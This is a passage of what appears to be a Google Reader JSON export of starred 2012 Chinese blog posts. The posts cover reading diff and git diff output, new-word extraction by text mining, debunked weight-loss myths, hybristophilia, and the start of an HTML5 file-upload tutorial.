@@</p>\n\n</blockquote>\n\n<p>前面的\"-1,7\"分成三个部分：减号表示第一个文件（即f1），\"1\"表示第1行，\"7\"表示连续7行。合在一起，就表示下面是第一个文件从第1行开始的连续7行。同样的，\"+1,7\"表示变动后，成为第二个文件从第1行开始的连续7行。</p>\n\n<p>第三部分是变动的具体内容。</p>\n\n<blockquote>\n\n<p>　　 a<br>\n　　 a<br>\n　　 a<br>\n　　-a<br>\n　　+b<br>\n　　 a<br>\n　　 a<br>\n　　 a</p>\n\n</blockquote>\n\n<p>除了有变动的那些行以外，也是上下文各显示3行。它将两个文件的上下文，合并显示在一起，所以叫做\"合并格式\"。每一行最前面的标志位，空表示无变动，减号表示第一个文件删除的行，加号表示第二个文件新增的行。</p>\n\n<p><strong>六、git格式的diff</strong></p>\n\n<p>版本管理系统git，使用的是合并格式diff的变体。</p>\n\n<blockquote>\n\n<p>　　$ git diff</p>\n\n</blockquote>\n\n<p>显示结果如下：</p>\n\n<blockquote>\n\n<p>　　diff --git a/f1 b/f1<br>\n　　index 6f8a38c..449b072 100644<br>\n　　--- a/f1<br>\n　　+++ b/f1<br>\n　　@@ -1,7 +1,7 @@<br>\n　　 a<br>\n　　 a<br>\n　　 a<br>\n　　-a<br>\n　　+b<br>\n　　 a<br>\n　　 a<br>\n　　 a</p>\n\n</blockquote>\n\n<p>第一行表示结果为git格式的diff。</p>\n\n<blockquote>\n\n<p>　　diff --git a/f1 b/f1</p>\n\n</blockquote>\n\n<p>进行比较的是，a版本的f1（即变动前）和b版本的f1（即变动后）。</p>\n\n<p>第二行表示两个版本的git哈希值（index区域的6f8a38c对象，与工作目录区域的449b072对象进行比较），最后的六位数字是对象的模式（普通文件，644权限）。</p>\n\n<blockquote>\n\n<p>　　index 6f8a38c..449b072 100644</p>\n\n</blockquote>\n\n<p>第三行表示进行比较的两个文件。</p>\n\n<blockquote>\n\n<p>　　--- a/f1<br>\n　　+++ b/f1</p>\n\n</blockquote>\n\n<p>\"---\"表示变动前的版本，\"+++\"表示变动后的版本。</p>\n\n<p>后面的行都与官方的合并格式diff相同。</p>\n\n<blockquote>\n\n<p>　　@@ -1,7 +1,7 @@<br>\n　　 a<br>\n　　 a<br>\n　　 a<br>\n　　-a<br>\n　　+b<br>\n　　 a<br>\n　　 a<br>\n　　 a</p>\n\n</blockquote>\n\n<p><strong>七、阅读材料</strong></p>\n\n<p>　　* <a href=\"http://en.wikipedia.org/wiki/Diff\">diff - Wikipedia</a> </p>\n\n<p>　　* <a href=\"http://www.markusbe.com/2009/12/how-to-read-a-patch-or-diff-and-understand-its-structure-to-apply-it-manually/\">How to read a patch or diff</a> </p>\n\n<p>　　* <a href=\"http://stackoverflow.com/questions/2529441/how-to-work-with-diff-representation-in-git\">How to work with diff representation in git</a> </p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html\">http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html</a></li>\n<li>最后修改时间：2012年10月 7日 20:53</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1346065379110",
    "timestampUsec" : "1346065379110271",
    "id" : "tag:google.com,2005:reader/item/316c03f8aeb9bd59",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "互联网时代的社会语言学：基于SNS的文本数据挖掘",
    "published" : 1346065379,
    "updated" : 1346065379,
    "alternate" : [ {
      "href" : "http://www.matrix67.com/blog/archives/5044",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>    今年上半年，我在人人网实习了一段时间，期间得到了很多宝贵的数据，并做了一些还算有意义的事情，在这里和大家一块儿分享。感谢人人网提供的数据与工作环境，感谢赵继承博士、詹卫东老师的支持和建议。在这项工作中，我得到了很多与众人交流的机会，特别感谢 OpenParty 、 TEDxBeijing 提供的平台。本文已发表在了《程序员》杂志，分上下两部分刊于 2012 年 7 月刊和 8 月刊，在此感谢卢鸫翔编辑的辛勤工作。由于众所周知的原因，《程序员》刊出的文章被和谐过（看到后面大家就自动地知道被和谐的内容是什么了），因而我决定把完整版发在 Blog 上，同时与更多的人一同分享。对此感兴趣的朋友可以给我发邮件继续交流。好了，开始说正文吧。</p>\n<p>    作为中文系应用语言学专业的学生以及一名数学 Geek ，我非常热衷于用计算的方法去分析汉语资料。汉语是一种独特而神奇的语言。对汉语资料进行自然语言处理时，我们会遇到很多其他语言不会有的困难，比如分词——汉语的词与词之间没有空格，那计算机怎么才知道，“已结婚的和尚未结婚的青年都要实行计划生育”究竟说的是“已／结婚／的／和／尚未／结婚／的／青年”，还是“已／结婚／的／和尚／未／结婚／的／青年”呢？这就是所谓的分词歧义难题。不过，现在很多语言模型已经能比较漂亮地解决这一问题了。但在中文分词领域里，还有一个比分词歧义更令人头疼的东西——未登录词。中文没有首字母大写，专名号也被取消了，这叫计算机如何辨认人名地名之类的东西？更惨的则是机构名、品牌名、专业名词、缩略语、网络新词等等，它们的产生机制似乎完全无规律可寻。最近十年来，中文分词领域都在集中攻克这一难关。自动发现新词成为了关键的环节。</p>\n<p>    挖掘新词的传统方法是，先对文本进行分词，然后猜测未能成功匹配的剩余片段就是新词。这似乎陷入了一个怪圈：分词的准确性本身就依赖于词库的完整性，如果词库中根本没有新词，我们又怎么能信任分词结果呢？此时，一种大胆的想法是，首先不依赖于任何已有的词库，仅仅根据词的共同特征，将一段大规模语料中可能成词的文本片段全部提取出来，不管它是新词还是旧词。然后，再把所有抽出来的词和已有词库进行比较，不就能找出新词了吗？有了抽词算法后，我们还能以词为单位做更多有趣的数据挖掘工作。这里，我所选用的语料是人人网 2011 年 12 月前半个月部分用户的状态。非常感谢人人网提供这份极具价值的网络语料。</p>\n<p><span></span><br>\n <br>\n <br>\n    要想从一段文本中抽出词来，我们的第一个问题就是，怎样的文本片段才算一个词？大家想到的第一个标准或许是，看这个文本片段出现的次数是否足够多。我们可以把所有出现频数超过某个阈值的片段提取出来，作为该语料中的词汇输出。不过，光是出现频数高还不够，一个经常出现的文本片段有可能不是一个词，而是多个词构成的词组。在人人网用户状态中，“的电影”出现了 389 次，“电影院”只出现了 175 次，然而我们却更倾向于把“电影院”当作一个词，因为直觉上看，“电影”和“院”凝固得更紧一些。</p>\n<p>    为了证明“电影院”一词的内部凝固程度确实很高，我们可以计算一下，如果“电影”和“院”真的是各自独立地在文本中随机出现，它俩正好拼到一起的概率会有多小。在整个 2400 万字的数据中，“电影”一共出现了 2774 次，出现的概率约为 0.000113 。“院”字则出现了 4797 次，出现的概率约为 0.0001969 。如果两者之间真的毫无关系，它们恰好拼在了一起的概率就应该是 0.000113 × 0.0001969 ，约为 2.223 × 10<sup>-8</sup> 次方。但事实上，“电影院”在语料中一共出现了 175 次，出现概率约为 7.183 × 10<sup>-6</sup> 次方，是预测值的 300 多倍。类似地，统计可得“的”字的出现概率约为 0.0166 ，因而“的”和“电影”随机组合到了一起的理论概率值为 0.0166 × 0.000113 ，约为 1.875 × 10<sup>-6</sup> ，这与“的电影”出现的真实概率很接近——真实概率约为 1.6 × 10<sup>-5</sup> 次方，是预测值的 8.5 倍。计算结果表明，“电影院”更可能是一个有意义的搭配，而“的电影”则更像是“的”和“电影”这两个成分偶然拼到一起的。</p>\n<p>    当然，作为一个无知识库的抽词程序，我们并不知道“电影院”是“电影”加“院”得来的，也并不知道“的电影”是“的”加上“电影”得来的。错误的切分方法会过高地估计该片段的凝合程度。如果我们把“电影院”看作是“电”加“影院”所得，由此得到的凝合程度会更高一些。因此，为了算出一个文本片段的凝合程度，我们需要枚举它的凝合方式——这个文本片段是由哪两部分组合而来的。令 p(x) 为文本片段 x 在整个语料中出现的概率，那么我们定义“电影院”的凝合程度就是 p(电影院) 与 p(电) · p(影院) 比值和 p(电影院) 与 p(电影) · p(院) 的比值中的较小值，“的电影”的凝合程度则是 p(的电影) 分别除以 p(的) · p(电影) 和 p(的电) · p(影) 所得的商的较小值。</p>\n<p>    可以想到，凝合程度最高的文本片段就是诸如“蝙蝠”、“蜘蛛”、“彷徨”、“忐忑”、“玫瑰”之类的词了，这些词里的每一个字几乎总是会和另一个字同时出现，从不在其他场合中使用。</p>\n<p> <br>\n    光看文本片段内部的凝合程度还不够，我们还需要从整体来看它在外部的表现。考虑“被子”和“辈子”这两个片段。我们可以说“买被子”、“盖被子”、“进被子”、“好被子”、“这被子”等等，在“被子”前面加各种字；但“辈子”的用法却非常固定，除了“一辈子”、“这辈子”、“上辈子”、“下辈子”，基本上“辈子”前面不能加别的字了。“辈子”这个文本片段左边可以出现的字太有限，以至于直觉上我们可能会认为，“辈子”并不单独成词，真正成词的其实是“一辈子”、“这辈子”之类的整体。可见，文本片段的自由运用程度也是判断它是否成词的重要标准。如果一个文本片段能够算作一个词的话，它应该能够灵活地出现在各种不同的环境中，具有非常丰富的左邻字集合和右邻字集合。</p>\n<p>    “信息熵”是一个非常神奇的概念，它能够反映知道一个事件的结果后平均会给你带来</p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.matrix67.com/blog/feed.asp",
      "title" : "Matrix67: My Blog",
      "htmlUrl" : "http://www.matrix67.com/blog"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1345920988286",
    "timestampUsec" : "1345920988286228",
    "id" : "tag:google.com,2005:reader/item/74f251ef5901949c",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "保鲜膜与辣椒霜，减肥“利”器不给力",
    "published" : 1345920988,
    "updated" : 1345920988,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/314452/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p><strong>流言：</strong> 运动时用保鲜膜包住想瘦的部位可以提高局部温度，大量排汗以达到燃烧脂肪的效果；而辣椒霜可以促进血液循环，帮助脂肪燃烧，瘦身纤体。</p>\n<p><strong>真相：</strong> 保鲜膜与辣椒霜是不少减肥攻略所推崇的减肥方法，不过它们的效果可经不起科学的拷问。</p>\n<div>\n<h1>保鲜膜：高温出汗不减脂</h1>\n<p>保鲜膜的透气性比较差，因此运动时裹在身上确实会提高局部体温，身体为了散热便会大量出汗。出汗后体重可能会减轻，因此很多人便觉得这样减肥确实有效果，却不知减轻的重量主要是身体损失的水分，补充水分以后重量就又回来了，而脂肪细胞里的脂肪是不会跟着汗水一起跑掉的。</p>\n<p>有人不禁要问，那提高温度可以加速新陈代谢，总能促进脂肪燃烧了吧？其实，脂肪的消耗与人体很多其他生理过程一样，牵扯到精密准确的调控过程，而高温对这个过程来说不见得是好事。</p>\n</div>\n<div>\n<h1>脂肪的“燃烧”</h1>\n<p>人在运动时，为肌肉提供能量的主要是两种物质：糖原和脂肪酸。糖原来自于碳水化合物，而脂肪酸则是由甘油三酯分解而来。储存在脂肪组织中的甘油三酯在分解为脂肪酸后，会由血液运送到需要能量的肌肉部位，是运动时脂肪酸的主要来源；除此之外还有一些脂肪酸分解自血液和肌肉组织中的甘油三酯<a href=\"http://www.guokr.com/#id12\">[1]</a>。脂肪酸被肌肉细胞吃进细胞质里，经过一系列转化后会被运进“能量工厂”线粒体中，最终变为细胞可以直接使用的能量。</p>\n<p>有不少科学家一直在研究影响脂肪酸氧化速率的因素。例如，有研究指出当人的运动强度由低强度（25%最大耗氧量）增加到中等强度（65%最大耗氧量）时，脂肪酸的氧化速率一直在上升，但当运动强度很高时（85%最大耗氧量）脂肪酸的氧化速率反而会下降，糖原的消耗量则大幅上升<a href=\"http://www.guokr.com/#id13\">[2]</a>，因此中低强度的运动较适合脂肪酸的消耗；除此之外，还有一些研究指出运动的模式和饮食习惯都可能会影响脂肪酸的氧化速率<a href=\"http://www.guokr.com/#id14\">[3]</a>。但是，在众多研究中并没有与体温相关的内容，没有所谓提高温度可以加速脂肪酸氧化速率的证据。</p>\n<p>其实脂肪“燃烧”的过程中有许多重要的酶参与，而人体内的酶对反应条件十分敏感，通常而言最佳温度在35-40℃之间，一旦超过40℃酶活性就会剧烈下降，甚至酶本身也会分解。因此保鲜膜裹住肌肉造成的局部高温不一定能促进脂肪消耗，却很可能起到反效果。</p>\n</div>\n<div>\n<h1>辣椒霜：被误解的作用</h1>\n<p>辣椒霜中的主要有效成分也是吃辣椒时让你涕泪横流的“罪魁祸首”——辣椒素。无色无嗅的辣椒素会让哺乳动物有火辣的灼烧感，是因为它可以刺激感受神经上的一种叫做TRPV1的受体，同时释放出一种与痛觉密切相关的P物质。P物质有扩张血管、加速血流的作用，所以被辣椒素刺激的部位会变红发热<a href=\"http://www.guokr.com/#id15\">[4]</a>。这样的反应和运动以后身体的发热很像，可能因此让人误以为能起到和运动一样的减肥作用。殊不知，运动减肥的真正原因是消耗了大量的能量，发热只是伴随产生的现象。扩张血管、加速血流或许会在一定程度上加快局部的新陈代谢，但并没有研究表明在皮肤上涂抹辣椒素会有显著的减肥效果。</p>\n<p>实际上，确实有药用的辣椒霜，不过不是用来减肥，而是用来——止痛！出人意料吧，能把人辣疼的辣椒素竟然也能止痛？原来通过辣椒素刺激神经可以让产生痛觉必不可少的P物质被释放出去，于是在P物质重新合成积累的这个过程中，人对疼痛就没那么敏感了，起到了止痛的作用。</p>\n<p>目前也有一些研究指出，辣椒素可能具有减肥作用，只不过不是用涂抹辣椒霜的方式，而是直接服用[5]。但要最终确认有效，并作为安全的药品用于减肥，还需要进一步的研究，并通过药物监管部门严格的安全性有效性审批。如果因为这些初步的研究，你就大吃特吃辣椒，妄图减肥的话，粉碎机要提醒你，减肥不见得有效，菊花是一定会辣的哈！（详见： <a href=\"http://www.guokr.com/article/101335/\">辣椒吃完后，为何辣“菊花”？</a> ）</p>\n</div>\n<div>\n<h1>科学地“燃烧”脂肪</h1>\n<p>无论是利用保鲜膜加温出汗还是涂抹辣椒霜都不是什么靠谱的减脂办法，不过了解了脂肪分解的特点，科学地指导消脂并不是不可能的事。</p>\n<p>就运动模式而言，前文提到，脂肪酸的氧化速率在高强度运动中会降低，但在低强度和中等强度的运动中较为理想，消耗速率的峰值大约是运动强度为65%最大耗氧量的时候。因此想要减肥的你记得不要选择强度过大的运动。除此之外，耐力训练（如长跑）也可以通过促进肌肉中的毛细血管增生和线粒体中蛋白质的增加，来显著提高脂肪酸氧化速率的峰值<a href=\"http://www.guokr.com/#id17\">[6]</a>，所以跑步是减脂的好选择哦。</p>\n<p>另外饮食习惯也很重要。如果在运动前摄入碳水化合物，会显著降低脂肪酸的消耗速率<a href=\"http://www.guokr.com/#id18\">[7]</a>，这种抑制作用对中低强度的运动尤其明显，而且抑制作用可以持续长达6个小时。想减肥的你在运动前可以减少碳水化合物的摄入，而以蛋白质、纤维素比较丰富的食物为主。不过需要提醒的是，完全不摄入碳水化合物是危险和不科学的，由此导致低血糖带来的危害更大。</p>\n<p><strong>结论：谣言粉碎。</strong> 保鲜膜的作用是提高局部温度，增加排汗。目前还没有研究表明提高温度可以促进脂肪消耗，而排汗带来的体重减轻也只是由于失水而非减脂。辣椒霜能够扩张血管，促进血液循环，同样没有证据表明它具有消脂的功能。</p>\n<div>\n<div><br></div>\n</div>\n<blockquote>\n脂肪燃烧真的……只是个比喻，不是热了烫了辣了就代表烧起来了呀！</blockquote>\n<div>\n<div><br></div>\n</div>\n<p>参考资料：</p>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td><a href=\"http://www.guokr.com/#id3\">[1]</a></td><td>Jeppesen, J. and B. Kiens, Regulation and limitations to fatty acid oxidation during exercise. J Physiol, 2012. 590(Pt 5): p. 1059-68.</td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td><a href=\"http://www.guokr.com/#id4\">[2]</a></td><td>Romijn, J.A., et al., Regulation of endogenous fat and carbohydrate metabolism in relation to exercise intensity and duration. Am J Physiol, 1993. 265(3 Pt 1): p. E380-91.</td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td><a href=\"http://www.guokr.com/#id5\">[3]</a></td><td>Achten, J. and A.E. Jeukendrup, Optimizing fat oxidation through exercise and diet. Nutrition, 2004. 20(7-8): p. 716-27.</td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td><a href=\"http://www.guokr.com/#id7\">[4]</a></td><td>Hayman.M , K.P.C.A., Capsaicin: A review of its pharmalogy and clinical applications. Current Anaesthesis &amp; Critical Care, 2008. 19: p. 338-343.</td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td>[5]</td><td>Lejeune, M.P., E.M. Kovacs, and M.S. Westerterp-Plantenga, Effect of capsaicin on substrate oxidation and weight maintenance after modest body-weight loss in human subjects. Br J Nutr, 2003. 90(3): p. 651-59.</td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td><a href=\"http://www.guokr.com/#id10\">[6]</a></td><td>Hurley, B.F., et al., Muscle triglyceride utilization during exercise: effect of training. J Appl Physiol, 1986. 60(2): p. 562-7.</td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td><a href=\"http://www.guokr.com/#id11\">[7]</a></td><td>Kirwan, J.P., D. O'Gorman, and W.J. Evans, A moderate glycemic meal before endurance exercise can enhance performance. J Appl Physiol, 1998. 84(1): p. 53-9.</td></tr>\n</tbody>\n</table>\n</div>\n</div>"
    },
    "author" : "绵羊c",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1345920826740",
    "timestampUsec" : "1345920826740610",
    "id" : "tag:google.com,2005:reader/item/3474567c34ae7c8c",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "姑娘，你为何喜欢“危险关系”？",
    "published" : 1345920826,
    "updated" : 1345920826,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/314419/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>8月14日，犯下多起枪击案的周克华被重庆警方击毙，据报道，在他最后的日子里，周克华曾经和自己的女友通电话，而正是这通电话让警方发现了他的蛛丝马迹。今天，媒体称警方提审了周克华的90后女友张贵英，并了解到，周克华在作案时都会和她“交流一些想法”。</p>\n<p>周克华，是一名杀人不眨眼的恶魔，又为什么会有年轻女性被他吸引，甚至包庇、更有可能协助他作案呢？实际上，这些愿意与杀人凶手维持“危险关系”的女性并不在少数。</p>\n<div>\n<h1>坏男孩，我的爱</h1>\n<p>1990年，20岁的加拿大少女卡拉•赫姆卡（Karla Homolka）协助未婚夫保罗•博纳多（Paul Bernardo）强奸了自己的妹妹泰米•赫姆卡。15岁的泰米被姐姐用麻药酣乐饮迷晕，最终因过量用药，医治无效死亡。二人在1991年筹办婚礼，却没有就此收手，先后残害两名花季少女。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/fj/fp/7y/fjfp7y.png\" alt=\"卡拉•赫姆卡。（cbc）\"><p>卡拉•赫姆卡。（cbc）</p></div>\n<p>1993年，赫姆卡和博纳多伏法，赫姆卡与法官达成认罪协议——交代所有罪案细节，以换取12年刑期，博纳多获得加拿大的最高刑期，被判终身监禁。2005年，赫姆卡高调出狱，与他人成婚育子，离开加拿大。</p>\n<p>和另一对著名的 <a href=\"http://www.guokr.com/article/19810/\">连环杀手情侣</a> 米拉•亨德利（Mira Hindley）和伊恩•布拉迪（Ian Brady）。对比后可以发现，她们的轨迹有着惊人的一致：二人都曾经是别人眼中的乖乖女，但在与男朋友认识之后便一发不可收拾，如同患上“邦尼和克莱德综合症”，变成了坏男孩控（hybristophilia）。坎氏精神病学词典（Campbell’s Psychiatric Dictionary）中定义，“坏男孩控”痴迷于实施恶行的罪犯，对其崇拜并由此获得性刺激。</p>\n<p>在性欲倒错的研究中，对“坏男孩控”进行的专门研究少之又少，美国精神医学学会出版的著名指导手册《精神疾病诊断与统计手册》中甚至还没有收录过这一名词。但大体上，坏男孩控可以分为两类：</p>\n</div>\n<div>\n<h1>第一类：被动型坏男孩控</h1>\n<p>1981年，英国的“约克郡开膛手” <a href=\"http://www.guokr.com/article/6158/\">彼得•萨特克里夫</a> 因杀害13名女性获不低于30年刑期。他所犯下的恶行给他带来了另一种关注的光环——入狱后，萨特克里夫每个星期都能收到30余封信件，竟有不少是表达爱慕之情的书信。</p>\n<p>20年后，BBC采访了那些与他有信件往来的女性，在她们那里得到了不一而同的说法。虽然这些女性最初怀有的目的不一样——如有人是对案情本身入迷，有人表达了同情心，还有人认为与凶手巧遇过——但她们最后都与这个杀人恶魔建立了稳定的恋人关系，以较高的频率书信往来多年。</p>\n<p>更有甚者，在“魔鬼的门徒”理查德•拉米雷斯（Richard Ramirez）那里，我们看到是一个奋不顾身的坏男孩控。拉米雷斯曾犯下13起谋杀、5起谋杀未遂、11起性骚扰和14起盗窃，他的每一项谋杀罪名指控都以死刑判结。但在多琳•罗伊（Doreen Lioy）的眼里，拉米雷斯始终都是一个无辜者，她甚至不顾亲人反目，在11年的长跑恋爱之后，1996年与拉米雷斯成婚。在罗伊接受采访时，她说：“当我在电视上看到他的入案照时，他的眼睛打动了我，我立刻被他迷住了。”</p>\n<div><img src=\"http://img1.guokr.com/gkimage/m7/gc/mw/m7gcmw.png\" alt=\"拉米雷斯和罗伊的结婚照。(trutv)\"><p>拉米雷斯和罗伊的结婚照。(trutv)</p></div>\n<p>一个观点认为：一些女性幻想与萨特克里夫、拉米雷斯这样的男人结合，是因为她们觉得自己正是其合适的对象——事实上她们很有可能是，因为这样做能使她们能感受到自己的与众不同。</p>\n<p>对于那些遭受虐待或被忽视的女性来说，和一个迫切需要与外界维持联系的人成为特殊朋友，才能得到满足感。他们不必要真实存在，或许只是梦中情人、假肢一样的存在——多琳•罗伊虽与拉米雷兹成婚，但因监狱条件限制，实际上他们的接触都是通过电话线来实现的。</p>\n<p>这一类人即是被动型的坏男孩控，她们无意于成为犯罪行为中的一份子，更多地是想改变重刑犯，或为其备受谴责的行为开脱。1995年，奥斯卡•雷•伯林（Oscar Ray Bolin）因其所犯的奸杀罪第11次接受审判，公共辩护律师罗莎丽•马丁内斯（Rosalie Martinez）与其一见钟情，同年内便与丈夫离婚，转身嫁给了伯林。即便是伯林被认定有罪，马丁内斯仍坚持为其辩护，认定他的清白。</p>\n</div>\n<div>\n<h1>第二类：主动型坏男孩控</h1>\n<p>和前者不同，这一类坏男孩控所迷恋的是那些尚在活跃的罪犯，如文章开头所提到的赫姆卡、亨德利以及数不尽的其他人。她们会参与男性罪犯的活动：诱捕受害人，藏匿尸体，犯下罪行。她们不会移情别恋，相反，她们希望得到对方回报的爱。</p>\n<p>2000年，《卫报》公开了米拉•亨德利的信件，其中写道：“有时候，我（在日记中）会写我讨厌布拉迪，因为他残酷无情；其它时候，我会祈求上帝，希望他能像我爱他那样爱我。”</p>\n<div><img src=\"http://img1.guokr.com/gkimage/br/i4/tm/bri4tm.png\" alt=\"米拉和布拉迪。（wiki）\"><p>米拉和布拉迪。（wiki）</p></div>\n<p>值得注意的是，绝大多数与之搭档的男性罪犯都具有反社会性格。根据《精神疾病诊断与统计手册》（DSM），这一类人没有同理心，不会悔过或能感受到真爱。不管是主动型还是被动型，受邦尼和克莱德综合症影响的女性都会陷入恶性恋爱关系，或饱受虐待。</p>\n<p>作为心理学的一个范畴，坏男孩控已经逐渐获得人们的关注。Discovery调查探索频道于2008年开播的系列节目《致命诱惑》（Wicked Attraction）就从第二类坏男孩控入手，介绍了诸多看似平常的男女在结合后所犯下的极端罪行。但实际上，它仍需要更多的关注和研究，不仅是为了那些罹患坏男孩控的人，还有每一个与之有利害关系的个体。</p>\n<div>\n<h2>了解更多：</h2>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td>[1]</td><td><a href=\"http://www.guardian.co.uk/world/2003/jan/13/gender.uk\">Why are women drawn to men behind bars?</a></td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td>[2]</td><td><a href=\"http://www.guardian.co.uk/uk/2000/feb/29/ukcrime.features11\">A journey into darkness</a></td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td>[3]</td><td><a href=\"http://news.bbc.co.uk/2/hi/uk_news/1318641.stm\">What do women see in Peter Sutcliffe?</a></td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td>[4]</td><td>文中部分内容编译自 <a href=\"http://suite101.com/article/hybristophilia-a111168\">What is Hybristophilia?</a></td></tr>\n</tbody>\n</table>\n</div>\n</div>\n</div>"
    },
    "author" : "gnm",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1345821260409",
    "timestampUsec" : "1345821260409368",
    "id" : "tag:google.com,2005:reader/item/553d984891ffd4b6",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "文件上传的渐进式增强",
    "published" : 1344574910,
    "updated" : 1344574910,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2012/08/file_upload.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>文件上传是最古老的互联网操作之一。</p><p>20多年了，它几乎没变，还是原来的样子：操作麻烦、缺乏交互、用户体验不佳。在这个新技术日新月异的时代，显得非常落伍。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201208/bg2012080901.png\" style=\"border:none\"></p>\n\n<p>网页开发者们想了很多办法，试图提升文件上传的功能和操作体验，在各种Javascript库的基础上，开发了五花八门的<a href=\"http://superdit.com/2010/06/29/10-jquery-ajax-file-uploader-plugins/\">插件</a>。可是，由于不同浏览器之间的差异，缺乏统一接口，这些插件要么用起来很麻烦，要么不能普遍适用。</p>\n\n<p>HTML5提供了一系列新的浏览器API，使得文件上传有可能出现革命性变化。英国程序员<a href=\"http://remysharp.com/\">Remy Sharp</a>总结了这些<a href=\"http://html5doctor.com/drag-and-drop-to-server/\">新的接口</a>，本文在他的文章基础上，讨论如何采用HTML5的API，对文件上传进行渐进式增强，实现以下功能：</p>\n\n<blockquote>\n\n<p>　　* iframe上传</p>\n\n<p>　　* ajax上传</p>\n\n<p>　　* 进度条</p>\n\n<p>　　* 文件预览</p>\n\n<p>　　* 拖放上传</p>\n\n</blockquote>\n\n<p>为了对这些功能有一个感性认识，你可以先看看Remy Sharp提供的<a href=\"http://html5demos.com/dnd-upload\">范例</a>。</p>\n\n<p>虽然这些API，还没有得到广泛部署，但它们是未来的潮流。有了它们，代码就可以写得非常优雅简洁，上面五个功能都能在20行以内实现。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201208/bg2012080902.png\" width=\"600\" style=\"border:none\"></p>\n\n<p><strong>一、传统形式</strong></p>\n\n<p>让我们从最基本的开始。</p>\n\n<p>文件上传的传统形式，是使用表单元素file：</p>\n\n<blockquote>\n\n<p>　　&lt;form id=&quot;upload-form&quot; action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;</p>\n\n<p>　　　　<strong>&lt;input type=&quot;file&quot; id=&quot;upload&quot; name=&quot;upload&quot; /&gt; &lt;br /&gt;</strong></p>\n\n<p>　　　　&lt;input type=&quot;submit&quot; value=&quot;Upload&quot; /&gt;</p>\n\n<p>　　&lt;/form&gt;</p>\n\n</blockquote>\n\n<p>所有浏览器都支持上面的代码。它在IE浏览器中，显示如下：</p>\n\n<p><img 